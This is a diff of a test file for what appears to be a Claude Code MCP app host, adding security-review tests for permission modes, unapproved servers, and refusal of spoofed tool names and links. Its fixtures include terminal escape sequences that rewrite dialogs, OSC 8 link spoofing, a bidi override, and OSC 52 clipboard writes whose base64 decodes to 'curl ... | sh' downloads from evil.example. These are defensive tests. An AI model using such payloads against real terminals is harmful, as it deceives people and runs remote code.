@@ -66,6 +66,8 @@ function standIns(
     searchMatches?: string[]
     /** Whether the app's tool says it only reads (annotations.readOnlyHint). */
     readOnly?: boolean
+    /** Claude Code's answer to `$.mcp.connect(server)`; connected under that name by default. */
+    connect?: (server: string) => unknown
   } = {},
 ) {
   const sent: Sent[] = []
@@ -167,7 +169,11 @@ function standIns(
       answer = {
         ok: true,
         tools: { 'get-time': { resourceUri: 'ui://get-time/mcp-app.html' } },
-        definitions: { 'get-time': { name: 'get-time', annotations: { readOnlyHint: opts.readOnly === true } } },
+        definitions: {
+          'get-time': { name: 'get-time', annotations: { readOnlyHint: opts.readOnly === true } },
+          'get-weather': { name: 'get-weather' },
+          'poll-stats': { name: 'poll-stats', _meta: { ui: { visibility: ['app'] } } },
+        },
       }
     }
     if (route === '/open') {
@@ -176,6 +182,12 @@ function standIns(
     }
     if (opts.answers?.[route] !== undefined) answer = opts.answers[route]
     return { value: { status: 200, ok: true, headers: {}, text: JSON.stringify(answer) } }
+  })
+  // Claude Code's verdict on a server (the mod asks before the helper hears its name).
+  const connects: string[] = []
+  on('mcp.connect', (_$, e) => {
+    connects.push(e.server)
+    return { value: (opts.connect?.(e.server) ?? { isConnected: true, server: e.server }) as never }
   })
   on('mcp.call', async (_$, e) => {
     mcpCalls.push({ server: e.server, tool: e.tool })
@@ -189,7 +201,7 @@ function standIns(
     stateWrites.push((e as { value: unknown }).value)
     return { value: { isSet: true, version: stateWrites.length + 1 } } as never
   })
-  return { sent, mcpCalls, asked, runs, submitted, contexts, filled, copied, finish, stateWrites, spawns: () => spawns }
+  return { sent, mcpCalls, asked, runs, submitted, contexts, filled, copied, finish, stateWrites, connects, spawns: () => spawns }
 }
 
 
@@ -454,16 +466,21 @@ for (const [deny, inlined] of [
   })
 }
 
-// An app's tool call: by default it runs, as in Claude Desktop (deny rules
-// still apply); `rules` follows the person's permission rules, asking where
-// they say ask (once, if allowed for the session); `ask` always asks.
+// An app's tool call: by default (`rules`) it follows the person's permission
+// rules, asking where they would ask (once, if allowed for the session), as
+// for Claude's own calls (security review, A2); `ask` always asks; `allow`,
+// an opt-in, runs it as Claude Desktop does. Deny rules apply in every mode.
 for (const [setting, decision, answer, expected, asks] of [
-  [undefined, 'ask', undefined, [true, true], 0],
+  [undefined, 'allow', undefined, [true, true], 0],
   [undefined, 'deny', undefined, [false, false], 0],
+  [undefined, 'ask', 'Allow get-weather this session', [true, true], 1],
+  [undefined, 'ask', 'Deny', [false, false], 2],
   ['rules', 'allow', undefined, [true, true], 0],
   ['rules', 'deny', undefined, [false, false], 0],
   ['rules', 'ask', 'Allow get-weather this session', [true, true], 1],
   ['rules', 'ask', 'Deny', [false, false], 2],
+  ['allow', 'ask', undefined, [true, true], 0],
+  ['allow', 'deny', undefined, [false, false], 0],
   ['ask', 'allow', 'Allow', [true, true], 2],
 ] as const) {
   const options: Record<string, string> = setting ? { appToolCalls: setting } : {}
@@ -489,6 +506,59 @@ for (const [setting, decision, answer, expected, asks] of [
     await settle(() => replies().length === 2)
     expect(replies().map((r) => (r.body.result as { allow: boolean }).allow)).toEqual([...expected])
     expect(asked.length).toBe(asks)
+    finish()
+  })
+}
+
+// The security review's A8: what an app asks about reaches Claude Code's
+// dialogs only as plain text. A tool its server doesn't list is refused
+// before anyone is asked; a link carrying terminal control sequences is refused.
+for (const [what, name] of [
+  ['a tool its server does not list', 'rm-everything'],
+  ['a tool name carrying an erase-and-rewrite sequence', 'get-weather\u001b[2K\rThe vanilla app wants to run get-time'],
+  ['a tool name carrying OSC 52 (a clipboard write)', 'get-weather\u001b]52;c;Y3VybCB4IHwgc2g=\u0007'],
+] as const) {
+  for (const setting of [undefined, 'ask'] as const) {
+    const options: Record<string, string> = setting ? { appToolCalls: setting } : {}
+    test(`${what}: refused, nobody asked (setting ${setting ?? 'default'})`, { options }, async ($, on) => {
+      const { sent, asked, mcpCalls, finish } = standIns(on, {
+        decision: 'ask',
+        answer: 'Allow',
+        script: async function* () {
+          yield { type: 'request', id: 24, viewId: TOOL_USE_ID, method: 'ui/allow-tool', params: { name, arguments: {} } }
+        },
+      })
+      await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
+      await $.tool.call({ tool: TOOL, tool_use_id: TOOL_USE_ID })
+      await settle(() => sent.some((s) => s.route === '/reply' && s.body.id === 24))
+      expect((sent.find((s) => s.body.id === 24)!.body.result as { allow: boolean }).allow).toBe(false)
+      expect(asked).toEqual([])
+      expect(mcpCalls.some((c) => c.tool === name)).toBe(false)
+      finish()
+    })
+  }
+}
+
+for (const [what, url] of [
+  ['an OSC 8 hyperlink (shows one address, opens another)', 'https://good.example/\u001b]8;;https://evil.example/\u0007click\u001b]8;;\u0007'],
+  ['OSC 52 (writes the clipboard)', 'https://good.example/\u001b]52;c;Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZSB8IHNo\u0007'],
+  ['cursor and erase sequences (rewrite the dialog)', 'https://evil.example/\u001b[2K\u001b[1Ghttps://good.example/'],
+  ['a C1 control (CSI as one character)', 'https://evil.example/\u009b2K'],
+  ['a bidi override', 'https://evil.example/\u202egro.doog'],
+] as const) {
+  test(`a link carrying ${what} is refused, and nobody is asked`, async ($, on) => {
+    const { sent, asked, runs, finish } = standIns(on, {
+      answer: 'Open',
+      script: async function* () {
+        yield appRequest(32, 'ui/open-link', { url })
+      },
+    })
+    await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
+    await $.tool.call({ tool: TOOL, tool_use_id: TOOL_USE_ID })
+    await settle(() => sent.some((s) => s.route === '/reply' && s.body.id === 32))
+    expect(sent.find((s) => s.route === '/reply' && s.body.id === 32)!.body.result).toEqual({ isError: true })
+    expect(asked).toEqual([])
+    expect(runs.some((argv) => argv.some((a) => a.includes('evil.example') || a.includes('good.example')))).toBe(false)
     finish()
   })
 }
@@ -995,6 +1065,45 @@ test('the helper starts with the first MCP call, not with the session', async ($
   finish()
 })
 
+// The security review's A1: the helper hears nothing of a server Claude Code
+// doesn't use in this session under that very name, so it can't start,
+// connect to or send anything to it: not as Claude writes the call, not when
+// ToolSearch loads its tool, not when the call runs.
+for (const [what, answer] of [
+  ['not approved (a repository server)', { isConnected: false, reason: 'unapproved', message: 'Not approved' }],
+  ['switched off', { isConnected: false, reason: 'disabled', message: 'Disabled' }],
+  ['refused by policy', { isConnected: false, reason: 'policy', message: 'Policy' }],
+  ['unknown to the session', { isConnected: false, reason: 'unlisted', message: 'Unlisted' }],
+  ['waiting for a sign-in', { isConnected: false, reason: 'auth', message: 'Needs sign-in' }],
+  ['running under another name (a claude.ai connector)', { isConnected: true, server: 'claude.ai Vanilla' }],
+] as const) {
+  test(`a server Claude Code reports as ${what}: the helper hears nothing of it, and nothing opens`, async ($, on) => {
+    const { sent, connects, spawns, finish } = standIns(on, { connect: () => answer, searchMatches: ['mcp__vanilla__get-time'] })
+    await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
+    await $.tool.call({ tool: 'ToolSearch', query: 'select:mcp__vanilla__get-time', max_results: 1 } as never)
+    const ran = await $.tool.call({ tool: TOOL, tool_use_id: TOOL_USE_ID })
+    // Claude's own call is untouched, and the model isn't told of an app.
+    expect(ran.result).toEqual(RESULT)
+    expect(ran.context?.some((note) => note.includes('MCP App')) ?? false).toBe(false)
+    for (let i = 0; i < 500; i++) await Promise.resolve()
+    expect(connects).toContain('vanilla')
+    expect(sent).toEqual([])
+    expect(spawns()).toBe(0)
+    finish()
+  })
+}
+
+test('a server Claude Code reports as connected under its own name gets its discovery and view', async ($, on) => {
+  const { sent, connects, finish } = standIns(on)
+  await $.session.start({ cwd: '/', surface: 'terminal', isInteractive: true })
+  await $.tool.call({ tool: TOOL, tool_use_id: TOOL_USE_ID })
+  await settle(() => sent.some((s) => s.route === '/open'))
+  expect(connects.every((name) => name === 'vanilla')).toBe(true)
+  // Asked before the helper heard the name.
+  expect(sent.find((s) => s.body.server === 'vanilla')).toBeDefined()
+  finish()
+})
+
 test('a view whose Chrome stopped says so, and can be opened again', async ($, on) => {
   const { sent, finish } = standIns(on, {
     script: async function* () {
@@ -1206,11 +1315,14 @@ test('a view out of sight gets no fresh copies (they would wake its paused page)
 })
 
 // An app-only tool (`visibility: ["app"]`) isn't registered with Claude Code,
-// so its permission check has nothing to go on and fails.
+// so its permission check has nothing to go on and fails. A check that fails
+// is no verdict: the person is asked, whatever the setting (security review, A2).
 for (const [setting, appOnly, expected, asks] of [
-  [undefined, true, true, 0],
+  [undefined, true, false, 1],
   [undefined, false, false, 1],
   ['rules', true, false, 1],
+  ['allow', true, false, 1],
+  ['allow', false, false, 1],
 ] as const) {
   const options: Record<string, string> = setting ? { appToolCalls: setting } : {}
   test(`a tool the check can't judge, setting ${setting ?? 'default'}, ${appOnly ? 'app-only' : 'one of Claude\'s'}: ${expected ? 'runs' : 'asked'}`, { options }, async ($, on) => {
@@ -1267,6 +1379,8 @@ function helperStandIns(
     return { value: undefined }
   })
   on('tool.call', () => ({ result: RESULT }))
+  // The server is one Claude Code uses (see the A1 tests).
+  on('mcp.connect', (_$, e) => ({ value: { isConnected: true, server: e.server } as never }))
   on('process.hookEnv', () => ({ value: (opts.env ?? {}) as never }))
   on('process.run', (_$, e) => {
     const argv = [...(e as unknown as { argv: string[] }).argv]
